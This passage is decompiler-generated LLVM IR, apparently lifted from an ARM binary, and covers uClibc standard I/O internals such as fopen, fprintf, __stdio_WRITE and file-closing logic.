  %storemerge24 = phi i32 [ %v1_199b0, %bb17 ], [ %v1_199ac, %dec_label_pc_199a8 ]
  %v1_199b4 = xor i1 %v2_199ac, true
  call void @__pseudo_cond_branch(i1 %v1_199b4, i32 ptrtoint (i32* @global_var_1ae24.1563 to i32))
  store i32 %storemerge24, i32* %sl.global-to-local, align 4
  %v0_199bc = load i32, i32* @r5, align 4
  %v1_199bc = add i32 %v0_199bc, 4
  %v2_199bc = inttoptr i32 %v1_199bc to i32*
  %v3_199bc = load i32, i32* %v2_199bc, align 4
  %v1_199c0 = call i32 @__GI_close(i32 %v3_199bc)
  %v0_199c8 = load i32, i32* @r6, align 4
  %v2_199d4 = add i32 %v0_199c8, 120
  %v3_199d4 = inttoptr i32 %v2_199d4 to i32*
  %v4_199d4 = load i32, i32* %v3_199d4, align 4
  store i32 %v4_199d4, i32* @r7, align 4
  %v1_199dc = load i32, i32* @r5, align 4
  %v2_199dc = add i32 %v1_199dc, 4
  %v3_199dc = inttoptr i32 %v2_199dc to i32*
  store i32 -1, i32* %v3_199dc, align 4
  %v0_199e4 = load i32, i32* @r6, align 4
  %v2_199e4 = add i32 %v0_199e4, 80
  %v3_199e4 = inttoptr i32 %v2_199e4 to i32*
  %v4_199e4 = load i32, i32* %v3_199e4, align 4
  %v1_199ec = icmp slt i32 %v1_199c0, 0
  store i32 %v4_199e4, i32* %stack_var_-80, align 4
  br i1 %v1_199ec, label %bb19, label %bb20

bb19:                                             ; preds = %bb18
  store i32 -1, i32* %sl.global-to-local, align 4
  br label %bb20

bb20:                                             ; preds = %bb18, %bb19
  call void @__pseudo_branch(i32 %v4_199e4)
  %v0_19a14 = load i32, i32* @r6, align 4
  %v2_19a14 = add i32 %v0_19a14, 20
  %v3_19a14 = inttoptr i32 %v2_19a14 to i32*
  %v4_19a14 = load i32, i32* %v3_19a14, align 4
  call void @__pseudo_branch(i32 %v4_19a14)
  %v0_19a24 = load i32, i32* @r6, align 4
  %v2_19a24 = add i32 %v0_19a24, 12
  %v3_19a24 = inttoptr i32 %v2_19a24 to i32*
  %v4_19a24 = load i32, i32* %v3_19a24, align 4
  %v1_19a28 = inttoptr i32 %v4_19a24 to i32*
  %v2_19a28 = load i32, i32* %v1_19a28, align 4
  %v1_19a30 = add i32 %v2_19a28, 1
  %v2_19a34 = add i32 %v0_19a24, 28
  %v3_19a34 = inttoptr i32 %v2_19a34 to i32*
  %v4_19a34 = load i32, i32* %v3_19a34, align 4
  store i32 %v4_19a34, i32* @r4, align 4
  store i32 %v1_19a30, i32* %v1_19a28, align 4
  call void @__pseudo_branch(i32 %v4_19a34)
  %v0_19a4c = load i32, i32* @r5, align 4
  %v1_19a4c = inttoptr i32 %v0_19a4c to i16*
  %v2_19a4c = load i16, i16* %v1_19a4c, align 2
  %v1_19a50 = and i16 %v2_19a4c, 24576
  %v1_19a54 = or i16 %v1_19a50, 48
  %v0_19a58 = load i32, i32* %sb.global-to-local, align 4
  %v2_19a58 = icmp eq i32 %v0_19a58, 0
  store i16 %v1_19a54, i16* %v1_19a4c, align 2
  br i1 %v2_19a58, label %.thread, label %bb21

bb21:                                             ; preds = %bb20
  br label %.thread

.thread:                                          ; preds = %bb20, %bb21
  %v2_19a6c = xor i1 %v2_19a58, true
  call void @__pseudo_cond_branch(i1 %v2_19a6c, i32 %v4_19a34)
  %v0_19a70 = load i32, i32* @r5, align 4
  %v1_19a70 = inttoptr i32 %v0_19a70 to i16*
  %v2_19a70 = load i16, i16* %v1_19a70, align 2
  %v1_19a74 = and i16 %v2_19a70, 16384
  %v2_19a74 = icmp eq i16 %v1_19a74, 0
  br i1 %v2_19a74, label %bb23, label %bb22

bb22:                                             ; preds = %.thread
  br label %bb23

bb23:                                             ; preds = %.thread, %bb22
  %v1_19a7c = xor i1 %v2_19a74, true
  call void @__pseudo_cond_branch(i1 %v1_19a7c, i32 ptrtoint (i32* @global_var_17278.1556 to i32))
  %v2_19a88 = load i32, i32* %stack_var_-80, align 4
  call void @__pseudo_branch(i32 %v2_19a88)
  call void @__pseudo_branch(i32 %v4_19a14)
  %v0_19aa8 = load i32, i32* @r6, align 4
  %v2_19aa8 = add i32 %v0_19aa8, 56
  %v3_19aa8 = inttoptr i32 %v2_19aa8 to i32*
  %v4_19aa8 = load i32, i32* %v3_19aa8, align 4
  %v1_19aac = inttoptr i32 %v4_19aa8 to i32*
  %v2_19aac = load i32, i32* %v1_19aac, align 4
  %v1_19ab0 = add i32 %v2_19aac, 1
  store i32 %v1_19ab0, i32* %v1_19aac, align 4
  call void @__pseudo_branch(i32 %v4_19a34)
  %v0_19ac8 = call i32 @_stdio_openlist_dec_use()
  %v0_19acc = load i32, i32* %sl.global-to-local, align 4
  %v2_19ad4 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_19ad4, i32* @r4, align 4
  store i32 %v6_19948, i32* @r5, align 4
  store i32 %v9_19948, i32* @r6, align 4
  store i32 %v12_19948, i32* @r7, align 4
  store i32 %v15_19948, i32* @r8, align 4
  store i32 %v27_19948, i32* @lr, align 4
  ret i32 %v0_19acc

; uselistorder directives
  uselistorder i1 %v2_19a74, { 1, 0 }
  uselistorder i32 %v4_19a34, { 0, 2, 1, 3 }
  uselistorder i32 %v1_19954, { 1, 0 }
  uselistorder i32 %v4_1994c, { 1, 0 }
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder i32* %sb.global-to-local, { 1, 0 }
  uselistorder label %bb23, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %dec_label_pc_199a8, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
}

define i32 @function_19ae0(i32 %arg1) local_unnamed_addr {
dec_label_pc_19ae0:
  %v0_19ae0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_19ae0, label %bb, label %.thread5

bb:                                               ; preds = %dec_label_pc_19ae0
  br label %.thread5

.thread5:                                         ; preds = %dec_label_pc_19ae0, %bb
  %v10_19af8 = phi i32 [ %arg1, %dec_label_pc_19ae0 ], [ 0, %bb ]
  ret i32 %v10_19af8

; uselistorder directives
  uselistorder label %.thread5, { 1, 0 }
}

define i32 @__GI_fopen(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 0, i32* @r2, align 4
  store i32 -1, i32* @r3, align 4
  %v0_19b0c = call i32 @_stdio_fopen()
  ret i32 %v0_19b0c
}

define i32 @fprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_-8, align 4
  %v2_19b28 = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v2_19b28, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_19b38 = call i32 @__GI_vfprintf()
  ret i32 %v0_19b38

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @__stdio_WRITE(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_19b4c = load i32, i32* @r4, align 4
  store i32 %v3_19b4c, i32* %stack_var_-24, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  store i32 2147483647, i32* %r8.global-to-local, align 4
  %v2_19b642 = icmp eq i32 %arg3, 0
  store i1 %v2_19b642, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19b642, label %dec_label_pc_19bf4, label %dec_label_pc_19b6c

dec_label_pc_19b64thread-pre-split:               ; preds = %dec_label_pc_19b6c
  %v3_19b84 = load i32, i32* %r6.global-to-local, align 4
  %v5_19b84 = add i32 %v3_19b84, %v3_19b7c
  store i32 %v5_19b84, i32* %r6.global-to-local, align 4
  %v4_19b88 = load i32, i32* %r5.global-to-local, align 4
  %v5_19b88 = sub i32 %v4_19b88, %v3_19b7c
  store i32 %v5_19b88, i32* %r5.global-to-local, align 4
  %v2_19b64 = icmp eq i32 %v5_19b88, 0
  store i1 %v2_19b64, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19b64, label %dec_label_pc_19b64.dec_label_pc_19bf4.loopexit_crit_edge, label %dec_label_pc_19b64thread-pre-split.dec_label_pc_19b6c_crit_edge

dec_label_pc_19b64thread-pre-split.dec_label_pc_19b6c_crit_edge: ; preds = %dec_label_pc_19b64thread-pre-split
  %v3_19b6c.pre = load i32, i32* %r8.global-to-local, align 4
  %v0_19b78.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_19b6c

dec_label_pc_19b6c:                               ; preds = %entry, %dec_label_pc_19b64thread-pre-split.dec_label_pc_19b6c_crit_edge
  %v0_19b78 = phi i32 [ %v0_19b78.pre, %dec_label_pc_19b64thread-pre-split.dec_label_pc_19b6c_crit_edge ], [ %tmp, %entry ]
  %v0_19b74 = phi i32 [ %v5_19b84, %dec_label_pc_19b64thread-pre-split.dec_label_pc_19b6c_crit_edge ], [ %arg2, %entry ]
  %v3_19b6c = phi i32 [ %v3_19b6c.pre, %dec_label_pc_19b64thread-pre-split.dec_label_pc_19b6c_crit_edge ], [ 2147483647, %entry ]
  %v0_19b70.in = phi i32 [ %v5_19b88, %dec_label_pc_19b64thread-pre-split.dec_label_pc_19b6c_crit_edge ], [ %arg3, %entry ]
  %v3_19b70 = phi i32 [ %v5_19b88, %dec_label_pc_19b64thread-pre-split.dec_label_pc_19b6c_crit_edge ], [ %arg3, %entry ]
  %v0_19b70 = icmp slt i32 %v0_19b70.in, 0
  %storemerge = select i1 %v0_19b70, i32 %v3_19b6c, i32 %v3_19b70
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  store i32 %v0_19b74, i32* %r1.global-to-local, align 4
  %v1_19b78 = add i32 %v0_19b78, 4
  %v2_19b78 = inttoptr i32 %v1_19b78 to i32*
  %v3_19b78 = load i32, i32* %v2_19b78, align 4
  %v3_19b7c = call i32 @__GI_write(i32 %v3_19b78, i32 %v0_19b74)
  %v1_19b80 = icmp slt i32 %v3_19b7c, 0
  %v2_19b80 = icmp eq i32 %v3_19b7c, 0
  store i1 %v2_19b80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_19b80, label %dec_label_pc_19b90, label %dec_label_pc_19b64thread-pre-split

dec_label_pc_19b90:                               ; preds = %dec_label_pc_19b6c
  %v0_19b90 = load i32, i32* %r4.global-to-local, align 4
  %v1_19b90 = inttoptr i32 %v0_19b90 to i16*
  %v2_19b90 = load i16, i16* %v1_19b90, align 2
  %v3_19b90 = zext i16 %v2_19b90 to i32
  store i32 %v3_19b90, i32* %r3.global-to-local, align 4
  %v1_19b94 = add i32 %v0_19b90, 8
  store i32 %v1_19b94, i32* %r1.global-to-local, align 4
  %v1_19b98 = inttoptr i32 %v1_19b94 to i32*
  %v2_19b98 = load i32, i32* %v1_19b98, align 4
  store i32 %v2_19b98, i32* %r1.global-to-local, align 4
  %v3_19b98 = add i32 %v0_19b90, 12
  %v4_19b98 = inttoptr i32 %v3_19b98 to i32*
  %v5_19b98 = load i32, i32* %v4_19b98, align 4
  %v1_19b9c = or i32 %v3_19b90, 8
  store i32 %v1_19b9c, i32* %r3.global-to-local, align 4
  %v2_19ba0 = sub i32 %v5_19b98, %v2_19b98
  store i32 %v2_19ba0, i32* %r2.global-to-local, align 4
  %v9_19ba0 = icmp eq i32 %v5_19b98, %v2_19b98
  store i1 %v9_19ba0, i1* %cpsr_z.global-to-local, align 1
  %v1_19ba4 = trunc i32 %v1_19b9c to i16
  store i16 %v1_19ba4, i16* %v1_19b90, align 2
  br i1 %v9_19ba0, label %dec_label_pc_19b90.dec_label_pc_19bf0_crit_edge, label %dec_label_pc_19bac

dec_label_pc_19b90.dec_label_pc_19bf0_crit_edge:  ; preds = %dec_label_pc_19b90
  %v0_19bf0.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_19bf0

dec_label_pc_19bac:                               ; preds = %dec_label_pc_19b90
  %v0_19bac = load i32, i32* %r2.global-to-local, align 4
  %v1_19bac = load i32, i32* %r5.global-to-local, align 4
  %v3_19bac = icmp ult i32 %v0_19bac, %v1_19bac
  %v9_19bac = icmp eq i32 %v0_19bac, %v1_19bac
  store i1 %v9_19bac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_19bac, label %.preheader, label %bb23

bb23:                                             ; preds = %dec_label_pc_19bac
  store i32 %v1_19bac, i32* %r2.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_19bac, %bb23
  %v2_19bc0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %bb24

bb24:                                             ; preds = %.preheader, %dec_label_pc_19bd4
  %v2_19bc0 = phi i32 [ %v2_19bc0.pre, %.preheader ], [ %v1_19bd8, %dec_label_pc_19bd4 ]
  %v0_19bb4 = load i32, i32* %r6.global-to-local, align 4
  %v1_19bb4 = inttoptr i32 %v0_19bb4 to i8*
  %v2_19bb4 = load i8, i8* %v1_19bb4, align 1
  %v3_19bb4 = zext i8 %v2_19bb4 to i32
  store i32 %v3_19bb4, i32* %r3.global-to-local, align 4
  %v7_19bb8 = icmp eq i8 %v2_19bb4, 10
  store i1 %v7_19bb8, i1* %cpsr_z.global-to-local, align 1
  %v1_19bbc = add i32 %v0_19bb4, 1
  store i32 %v1_19bbc, i32* %r6.global-to-local, align 4
  %v3_19bc0 = inttoptr i32 %v2_19bc0 to i8*
  store i8 %v2_19bb4, i8* %v3_19bc0, align 1
  %v0_19bc4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_19bc4, label %dec_label_pc_19bc8, label %dec_label_pc_19bd4

dec_label_pc_19bc8:                               ; preds = %bb24
  %v0_19bc8 = load i32, i32* %r4.global-to-local, align 4
  %v1_19bc8 = inttoptr i32 %v0_19bc8 to i16*
  %v2_19bc8 = load i16, i16* %v1_19bc8, align 2
  %v3_19bc8 = zext i16 %v2_19bc8 to i32
  store i32 %v3_19bc8, i32* %r3.global-to-local, align 4
  %v1_19bcc = and i32 %v3_19bc8, 256
  %v2_19bcc = icmp eq i32 %v1_19bcc, 0
  store i1 %v2_19bcc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19bcc, label %dec_label_pc_19bd4, label %dec_label_pc_19bc8.dec_label_pc_19be0_crit_edge

dec_label_pc_19bc8.dec_label_pc_19be0_crit_edge:  ; preds = %dec_label_pc_19bc8
  %v0_19be4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_19be0

dec_label_pc_19bd4:                               ; preds = %dec_label_pc_19bc8, %bb24
  %v0_19bd4 = load i32, i32* %r2.global-to-local, align 4
  %v1_19bd4 = add i32 %v0_19bd4, -1
  store i32 %v1_19bd4, i32* %r2.global-to-local, align 4
  %v7_19bd4 = icmp eq i32 %v0_19bd4, 1
  store i1 %v7_19bd4, i1* %cpsr_z.global-to-local, align 1
  %v0_19bd8 = load i32, i32* %r1.global-to-local, align 4
  %v1_19bd8 = add i32 %v0_19bd8, 1
  store i32 %v1_19bd8, i32* %r1.global-to-local, align 4
  br i1 %v7_19bd4, label %dec_label_pc_19bd4.dec_label_pc_19be0_crit_edge, label %bb24

dec_label_pc_19bd4.dec_label_pc_19be0_crit_edge:  ; preds = %dec_label_pc_19bd4
  %v0_19be0.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_19be0

dec_label_pc_19be0:                               ; preds = %dec_label_pc_19bc8.dec_label_pc_19be0_crit_edge, %dec_label_pc_19bd4.dec_label_pc_19be0_crit_edge
  %v0_19be4 = phi i32 [ %v1_19bd8, %dec_label_pc_19bd4.dec_label_pc_19be0_crit_edge ], [ %v0_19be4.pre, %dec_label_pc_19bc8.dec_label_pc_19be0_crit_edge ]
  %v0_19be0 = phi i32 [ %v0_19be0.pre, %dec_label_pc_19bd4.dec_label_pc_19be0_crit_edge ], [ %v0_19bc8, %dec_label_pc_19bc8.dec_label_pc_19be0_crit_edge ]
  %v1_19be0 = add i32 %v0_19be0, 8
  %v2_19be0 = inttoptr i32 %v1_19be0 to i32*
  %v3_19be0 = load i32, i32* %v2_19be0, align 4
  store i32 %v3_19be0, i32* %r3.global-to-local, align 4
  %v2_19be4 = add i32 %v0_19be0, 16
  %v3_19be4 = inttoptr i32 %v2_19be4 to i32*
  store i32 %v0_19be4, i32* %v3_19be4, align 4
  %v0_19be8 = load i32, i32* %r3.global-to-local, align 4
  %v1_19be8 = load i32, i32* %r1.global-to-local, align 4
  %v2_19be8 = sub i32 %v1_19be8, %v0_19be8
  store i32 %v2_19be8, i32* %r3.global-to-local, align 4
  %v1_19bec = load i32, i32* %r5.global-to-local, align 4
  %v2_19bec = sub i32 %v1_19bec, %v2_19be8
  store i32 %v2_19bec, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_19bf0

dec_label_pc_19bf0:                               ; preds = %dec_label_pc_19b90.dec_label_pc_19bf0_crit_edge, %dec_label_pc_19be0
  %v0_19bf0 = phi i32 [ %v0_19bf0.pre, %dec_label_pc_19b90.dec_label_pc_19bf0_crit_edge ], [ %v2_19bec, %dec_label_pc_19be0 ]
  %v1_19bf0 = load i32, i32* @r7, align 4
  %v2_19bf0 = sub i32 %v1_19bf0, %v0_19bf0
  br label %dec_label_pc_19bf4

dec_label_pc_19b64.dec_label_pc_19bf4.loopexit_crit_edge: ; preds = %dec_label_pc_19b64thread-pre-split
  %v0_19bf4.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_19bf4

dec_label_pc_19bf4:                               ; preds = %entry, %dec_label_pc_19b64.dec_label_pc_19bf4.loopexit_crit_edge, %dec_label_pc_19bf0
  %v0_19bf4 = phi i32 [ %v2_19bf0, %dec_label_pc_19bf0 ], [ %v0_19bf4.pre.pre, %dec_label_pc_19b64.dec_label_pc_19bf4.loopexit_crit_edge ], [ 0, %entry ]
  %v2_19bf8 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_19bf8, i32* %r4.global-to-local, align 4
  ret i32 %v0_19bf4

; uselistorder directives
  uselistorder i32 %v0_19be0, { 1, 0 }
  uselistorder i32 %v1_19bd8, { 0, 2, 1 }
  uselistorder i32 %v0_19bd4, { 1, 0 }
  uselistorder i32 %v1_19bac, { 0, 2, 1 }
  uselistorder i32 %v0_19bac, { 1, 0 }
  uselistorder i32 %v5_19b98, { 1, 0 }
  uselistorder i32 %v2_19b98, { 1, 0, 2 }
  uselistorder i32 %v3_19b7c, { 2, 3, 0, 1 }
  uselistorder i32 %v0_19b74, { 1, 0 }
  uselistorder i32 %v5_19b88, { 2, 0, 1, 3 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r5.global-to-local, { 0, 3, 4, 2, 1, 5, 6 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32* %r2.global-to-local, { 2, 4, 3, 5, 6, 1, 0 }
  uselistorder i32* %r1.global-to-local, { 4, 1, 5, 3, 2, 6, 7, 8, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32 (i32, i32)* @__GI_write, { 0, 2, 1 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_19bf4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_19bf0, { 1, 0 }
  uselistorder label %dec_label_pc_19be0, { 1, 0 }
  uselistorder label %bb24, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_19b6c, { 1, 0 }
}

define i32 @_stdio_fopen() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_19c00 = load i32, i32* @r4, align 4
  store i32 %v3_19c00, i32* %stack_var_-36, align 4
  %v6_19c00 = load i32, i32* @r5, align 4
  %v9_19c00 = load i32, i32* @r6, align 4
  %v18_19c00 = load i32, i32* @sb, align 4
  %v24_19c00 = load i32, i32* @fp, align 4
  %v0_19c04 = load i32, i32* @r1, align 4
  %v1_19c04 = inttoptr i32 %v0_19c04 to i8*
  %v2_19c04 = load i8, i8* %v1_19c04, align 1
  %v3_19c04 = zext i8 %v2_19c04 to i32
  store i32 %v3_19c04, i32* @ip, align 4
  %v7_19c0c = icmp eq i8 %v2_19c04, 114
  store i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32* @fp, align 4
  %v2_19c14 = ptrtoint i32* %stack_var_-72 to i32
  %v0_19c18 = load i32, i32* @r0, align 4
  store i32 %v0_19c18, i32* @r6, align 4
  %v0_19c1c = load i32, i32* @r2, align 4
  store i32 %v0_19c1c, i32* @sb, align 4
  %v0_19c20 = load i32, i32* @r3, align 4
  store i32 %v0_19c20, i32* @r5, align 4
  br i1 %v7_19c0c, label %dec_label_pc_19c6c, label %dec_label_pc_19c28

dec_label_pc_19c28:                               ; preds = %entry
  %v7_19c28 = icmp eq i8 %v2_19c04, 119
  br i1 %v7_19c28, label %bb, label %dec_label_pc_19c34

bb:                                               ; preds = %dec_label_pc_19c28
  store i32 577, i32* @r4, align 4
  br label %dec_label_pc_19c70

dec_label_pc_19c34:                               ; preds = %dec_label_pc_19c28
  %v7_19c34 = icmp eq i8 %v2_19c04, 97
  br i1 %v7_19c34, label %bb34, label %dec_label_pc_19c40

bb34:                                             ; preds = %dec_label_pc_19c34
  store i32 1089, i32* @r4, align 4
  br label %dec_label_pc_19c70

dec_label_pc_19c40:                               ; preds = %dec_label_pc_19c34, %dec_label_pc_19cf4, %dec_label_pc_19cc8
  %v0_19c40 = call i32 @__GI___errno_location()
  store i32 %v0_19c40, i32* %r0.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  %v0_19c48 = load i32, i32* @sb, align 4
  %v2_19c48 = icmp eq i32 %v0_19c48, 0
  %v2_19c4c = inttoptr i32 %v0_19c40 to i32*
  store i32 22, i32* %v2_19c4c, align 4
  br i1 %v2_19c48, label %dec_label_pc_19ec0, label %dec_label_pc_19c54

dec_label_pc_19c54:                               ; preds = %dec_label_pc_19d18._crit_edge, %dec_label_pc_19c40
  %v0_19c54 = load i32, i32* @sb, align 4
  %v1_19c54 = inttoptr i32 %v0_19c54 to i16*
  %v2_19c54 = load i16, i16* %v1_19c54, align 2
  %v3_19c54 = zext i16 %v2_19c54 to i32
  store i32 %v3_19c54, i32* %r3.global-to-local, align 4
  %v1_19c58 = and i32 %v3_19c54, 8192
  %v2_19c58 = icmp eq i32 %v1_19c58, 0
  br i1 %v2_19c58, label %dec_label_pc_19ec0, label %dec_label_pc_19c60

dec_label_pc_19c60:                               ; preds = %dec_label_pc_19c54
  store i32 %v0_19c54, i32* @r0, align 4
  %v0_19c64 = call i32 @free()
  store i32 %v0_19c64, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19ec0

dec_label_pc_19c6c:                               ; preds = %entry
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_19c70

dec_label_pc_19c70:                               ; preds = %bb, %bb34, %dec_label_pc_19c6c
  %v1_19c88 = phi i32 [ 1089, %bb34 ], [ 577, %bb ], [ 1, %dec_label_pc_19c6c ]
  %v1_19c70 = add i32 %v0_19c04, 1
  %v2_19c70 = inttoptr i32 %v1_19c70 to i8*
  %v3_19c70 = load i8, i8* %v2_19c70, align 1
  %v7_19c74 = icmp eq i8 %v3_19c70, 98
  %v1_19c70.v0_19c04 = select i1 %v7_19c74, i32 %v1_19c70, i32 %v0_19c04
  store i32 %v1_19c70.v0_19c04, i32* %r3.global-to-local, align 4
  %v1_19c80 = add i32 %v1_19c70.v0_19c04, 1
  %v2_19c80 = inttoptr i32 %v1_19c80 to i8*
  %v3_19c80 = load i8, i8* %v2_19c80, align 1
  %v4_19c80 = zext i8 %v3_19c80 to i32
  store i32 %v4_19c80, i32* @r3, align 4
  %v7_19c84 = icmp eq i8 %v3_19c80, 43
  br i1 %v7_19c84, label %bb37, label %.thread5

bb37:                                             ; preds = %dec_label_pc_19c70
  store i32 %v1_19c88, i32* @r3, align 4
  %v2_19c8c = add nuw nsw i32 %v1_19c88, 1
  store i32 %v2_19c8c, i32* @r4, align 4
  br label %.thread5

.thread5:                                         ; preds = %dec_label_pc_19c70, %bb37
  %v2_19c90 = icmp eq i32 %v0_19c1c, 0
  br i1 %v2_19c90, label %dec_label_pc_19c98, label %dec_label_pc_19cc0

dec_label_pc_19c98:                               ; preds = %.thread5
  store i32 80, i32* %r0.global-to-local, align 4
  %v1_19c9c = call i32 @malloc(i32 80)
  store i32 %v1_19c9c, i32* %r0.global-to-local, align 4
  store i32 %v1_19c9c, i32* @sb, align 4
  %v3_19ca0 = icmp eq i32 %v1_19c9c, 0
  br i1 %v3_19ca0, label %dec_label_pc_19ec4, label %dec_label_pc_19ca8

dec_label_pc_19ca8:                               ; preds = %dec_label_pc_19c98
  %v2_19cac = add i32 %v1_19c9c, 8
  %v3_19cac = inttoptr i32 %v2_19cac to i32*
  store i32 0, i32* %v3_19cac, align 4
  store i32 8192, i32* %r3.global-to-local, align 4
  %v2_19cb4 = load i32, i32* @sb, align 4
  %v3_19cb4 = inttoptr i32 %v2_19cb4 to i16*
  store i16 8192, i16* %v3_19cb4, align 2
  %v0_19cb8 = load i32, i32* @sb, align 4
  %v1_19cb8 = add i32 %v0_19cb8, 56
  store i32 %v1_19cb8, i32* @r0, align 4
  %v1_19cbc = call i32 @__stdio_init_mutex(i32 %v1_19cb8)
  store i32 %v1_19cbc, i32* %r0.global-to-local, align 4
  %v0_19cc0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_19cc0

dec_label_pc_19cc0:                               ; preds = %.thread5, %dec_label_pc_19ca8
  %v0_19d18 = phi i32 [ %v0_19c20, %.thread5 ], [ %v0_19cc0.pre, %dec_label_pc_19ca8 ]
  %v1_19cc0 = icmp slt i32 %v0_19d18, 0
  br i1 %v1_19cc0, label %dec_label_pc_19d18, label %dec_label_pc_19cc8

dec_label_pc_19cc8:                               ; preds = %dec_label_pc_19cc0
  %v0_19ccc = load i32, i32* @r4, align 4
  %v2_19ccc = and i32 %v0_19ccc, ptrtoint ([7 x i8]* @global_var_20003.1572 to i32)
  %v1_19cd0 = add i32 %v2_19ccc, 1
  store i32 %v1_19cd0, i32* @r2, align 4
  %v0_19cd4 = load i32, i32* @r6, align 4
  %v1_19cd4 = add i32 %v0_19cd4, 1
  %v2_19cd8 = and i32 %v1_19cd4, %v1_19cd0
  store i32 %v2_19cd8, i32* %r3.global-to-local, align 4
  %v9_19cdc = icmp eq i32 %v2_19cd8, %v1_19cd0
  %v1_19ce0 = load i32, i32* @sb, align 4
  %v2_19ce0 = add i32 %v1_19ce0, 4
  %v3_19ce0 = inttoptr i32 %v2_19ce0 to i32*
  store i32 %v0_19d18, i32* %v3_19ce0, align 4
  br i1 %v9_19cdc, label %dec_label_pc_19ce8, label %dec_label_pc_19c40

dec_label_pc_19ce8:                               ; preds = %dec_label_pc_19cc8
  %v0_19ce8 = load i32, i32* @r4, align 4
  %v1_19ce8 = load i32, i32* @r6, align 4
  %v2_19ce8 = sub i32 -1, %v1_19ce8
  %v3_19ce8 = and i32 %v0_19ce8, %v2_19ce8
  store i32 %v3_19ce8, i32* @r3, align 4
  %v1_19cec = and i32 %v3_19ce8, 1024
  %v2_19cec = icmp eq i32 %v1_19cec, 0
  br i1 %v2_19cec, label %dec_label_pc_19d0c, label %dec_label_pc_19cf4

dec_label_pc_19cf4:                               ; preds = %dec_label_pc_19ce8
  %v0_19cf4 = load i32, i32* @r5, align 4
  store i32 %v0_19cf4, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 1024, i32* @r2, align 4
  %v2_19d00 = call i32 @__libc_fcntl(i32 %v0_19cf4, i32 4)
  store i32 %v2_19d00, i32* %r0.global-to-local, align 4
  %v2_19d04 = icmp eq i32 %v2_19d00, 0
  br i1 %v2_19d04, label %dec_label_pc_19cf4.dec_label_pc_19d0c_crit_edge, label %dec_label_pc_19c40

dec_label_pc_19cf4.dec_label_pc_19d0c_crit_edge:  ; preds = %dec_label_pc_19cf4
  %v0_19d0c.pre = load i32, i32* @r6, align 4
  %v0_19d10.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_19d0c

dec_label_pc_19d0c:                               ; preds = %dec_label_pc_19cf4.dec_label_pc_19d0c_crit_edge, %dec_label_pc_19ce8
  %v0_19d10 = phi i32 [ %v0_19d10.pre, %dec_label_pc_19cf4.dec_label_pc_19d0c_crit_edge ], [ %v0_19ce8, %dec_label_pc_19ce8 ]
